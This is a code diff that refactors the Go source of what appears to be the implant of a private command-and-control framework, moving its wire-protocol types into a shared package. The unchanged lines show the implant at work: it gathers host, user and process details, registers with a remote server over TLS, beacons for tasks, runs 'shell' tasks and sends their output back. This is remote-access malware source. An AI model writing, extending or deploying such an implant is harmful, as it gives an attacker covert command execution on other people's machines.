@@ -23,53 +23,10 @@ import (
 	"time"
 
 	"github.com/azizbinmohammad/private-c2/pkg/envelope"
+	"github.com/azizbinmohammad/private-c2/pkg/protocol"
 )
 
-// Wire protocol message types.
-type Message struct {
-	Type string          `json:"type"`
-	Data json.RawMessage `json:"data"`
-}
-
-type RegisterData struct {
-	ImplantID string `json:"implant_id"`
-	Hostname  string `json:"hostname"`
-	Username  string `json:"username"`
-	OS        string `json:"os"`
-	Arch      string `json:"arch"`
-	PID       int    `json:"pid"`
-	Process   string `json:"process"`
-	Mode      string `json:"mode"`
-}
-
-type RegisterAckData struct {
-	SessionID string `json:"session_id"`
-	Interval  int    `json:"interval"`
-}
-
-type CheckinData struct {
-	SessionID string `json:"session_id"`
-}
-
-type Task struct {
-	ID   string `json:"id"`
-	Type string `json:"type"`
-	Args string `json:"args"`
-}
-
-type TaskingData struct {
-	Tasks []Task `json:"tasks"`
-}
-
-type ResultData struct {
-	SessionID string `json:"session_id"`
-	TaskID    string `json:"task_id"`
-	Success   bool   `json:"success"`
-	Output    string `json:"output"`
-	Error     string `json:"error"`
-}
-
-func sendMessage(conn net.Conn, msg *Message) error {
+func sendMessage(conn net.Conn, msg *protocol.Message) error {
 	data, err := json.Marshal(msg)
 	if err != nil {
 		return fmt.Errorf("marshal message: %w", err)
@@ -77,12 +34,12 @@ func sendMessage(conn net.Conn, msg *Message) error {
 	return envelope.WriteFrame(conn, data)
 }
 
-func readMessage(conn net.Conn) (*Message, error) {
+func readMessage(conn net.Conn) (*protocol.Message, error) {
 	data, err := envelope.ReadFrame(conn)
 	if err != nil {
 		return nil, err
 	}
-	var msg Message
+	var msg protocol.Message
 	if err := json.Unmarshal(data, &msg); err != nil {
 		return nil, fmt.Errorf("unmarshal message: %w", err)
 	}
@@ -120,14 +77,14 @@ func buildTLSConfig(caPath string) (*tls.Config, error) {
 	return cfg, nil
 }
 
-func collectSystemInfo() RegisterData {
+func collectSystemInfo() protocol.RegisterData {
 	hostname, _ := os.Hostname()
 	username := "unknown"
 	if u, err := user.Current(); err == nil {
 		username = u.Username
 	}
 
-	return RegisterData{
+	return protocol.RegisterData{
 		ImplantID: generateImplantID(),
 		Hostname:  hostname,
 		Username:  username,
@@ -163,7 +120,7 @@ func executeShell(ctx context.Context, cmdStr string) (string, error) {
 	return string(out), err
 }
 
-func handleTask(ctx context.Context, task Task) (string, error) {
+func handleTask(ctx context.Context, task protocol.TaskWire) (string, error) {
 	switch task.Type {
 	case "shell":
 		return executeShell(ctx, task.Args)
@@ -243,12 +200,12 @@ func connect(serverAddr string, tlsConfig *tls.Config) (net.Conn, error) {
 	return conn, nil
 }
 
-func register(conn net.Conn, info RegisterData) (string, error) {
+func register(conn net.Conn, info protocol.RegisterData) (string, error) {
 	regData, err := json.Marshal(info)
 	if err != nil {
 		return "", err
 	}
-	msg := &Message{Type: "register", Data: regData}
+	msg := &protocol.Message{Type: "register", Data: regData}
 	if err := sendMessage(conn, msg); err != nil {
 		return "", fmt.Errorf("send register: %w", err)
 	}
@@ -261,7 +218,7 @@ func register(conn net.Conn, info RegisterData) (string, error) {
 		return "", fmt.Errorf("expected register_ack, got %s", ack.Type)
 	}
 
-	var ackData RegisterAckData
+	var ackData protocol.RegisterAckData
 	if err := json.Unmarshal(ack.Data, &ackData); err != nil {
 		return "", fmt.Errorf("unmarshal register_ack: %w", err)
 	}
@@ -362,8 +319,8 @@ func beaconLoop(ctx context.Context, conn net.Conn, sessionID string, interval t
 		}
 
 		// Send checkin.
-		checkinData, _ := json.Marshal(CheckinData{SessionID: sessionID})
-		if err := sendMessage(conn, &Message{Type: "checkin", Data: checkinData}); err != nil {
+		checkinData, _ := json.Marshal(protocol.CheckinData{SessionID: sessionID})
+		if err := sendMessage(conn, &protocol.Message{Type: "checkin", Data: checkinData}); err != nil {
 			return fmt.Errorf("send checkin: %w", err)
 		}
 
@@ -380,7 +337,7 @@ func beaconLoop(ctx context.Context, conn net.Conn, sessionID string, interval t
 			continue
 		}
 
-		var tasking TaskingData
+		var tasking protocol.TaskingData
 		if err := json.Unmarshal(taskingMsg.Data, &tasking); err != nil {
 			log.Printf("unmarshal tasking: %v", err)
 			continue
@@ -390,7 +347,7 @@ func beaconLoop(ctx context.Context, conn net.Conn, sessionID string, interval t
 		for _, task := range tasking.Tasks {
 			output, taskErr := handleTask(ctx, task)
 
-			result := ResultData{
+			result := protocol.ResultData{
 				SessionID: sessionID,
 				TaskID:    task.ID,
 				Success:   taskErr == nil,
@@ -402,7 +359,7 @@ func beaconLoop(ctx context.Context, conn net.Conn, sessionID string, interval t
 			}
 
 			resultJSON, _ := json.Marshal(result)
-			if err := sendMessage(conn, &Message{Type: "result", Data: resultJSON}); err != nil {
+			if err := sendMessage(conn, &protocol.Message{Type: "result", Data: resultJSON}); err != nil {
 				return fmt.Errorf("send result: %w", err)
 			}
 
